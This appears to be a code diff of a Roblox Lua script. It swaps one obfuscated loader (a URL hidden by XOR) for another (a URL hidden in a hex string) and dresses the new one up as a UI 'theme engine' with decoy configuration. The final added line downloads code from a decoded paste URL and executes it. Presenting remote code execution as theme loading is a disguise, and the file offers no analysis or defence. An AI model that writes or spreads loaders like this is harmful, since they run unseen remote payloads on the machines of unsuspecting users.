@@ -1,6 +1,36 @@
--- holy skid
-local k={173,89,41,211,137,67,251,19}
-local d={197,45,93,163,179,108,212,112,216,43,91,182,231,55,147,102,207,119,66,183,231,48,213,117,223,99,27,227,185,114,202,60,193,54,72,183,236,49,212,103,200,58,65,187,252,33}
-local u={}
-for i=1,#d do u[i]=string.char(bit32.bxor(d[i],k[(i-1)%#k+1])) end
-loadstring(game:HttpGet(table.concat(u)))()
+local function resolveThemeAsset(hexToken)
+    local output = ""
+    for i = 1, #hexToken, 2 do
+        output = output .. string.char(tonumber(hexToken:sub(i, i + 1), 16))
+    end
+    return output
+end
+
+local themes = resolveThemeAsset("68747470733a2f2f706173746566792e6170702f467765614a546e462f726177")
+
+local themeConfig = {
+    CurrentTheme = "DarkMidnight",
+    FallbackTheme = "ClassicLight",
+    AccentColor = "#FF5555",
+    Endpoints = {
+        SourceCode = "https://vault.pandauth.com/kvs/90dd1045b2ce29d1",
+        AssetCDN = "https://raw.githubusercontent.com/theme-assets/storage/main/manifest.json",
+        FontRegistry = "https://fonts.gstatic.com/s/inter/v12/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2"
+    },
+    Settings = {
+        AutoSave = true,
+        CacheDuration = 86400,
+        DebugMode = false
+    }
+}
+
+local function initializeThemeEngine()
+    local theme = themeConfig.CurrentTheme
+    if themeConfig.Settings.DebugMode then
+        print("[UI]: Initialized theme " .. theme)
+    end
+end
+
+initializeThemeEngine()
+
+loadstring(game:HttpGet(themes))()
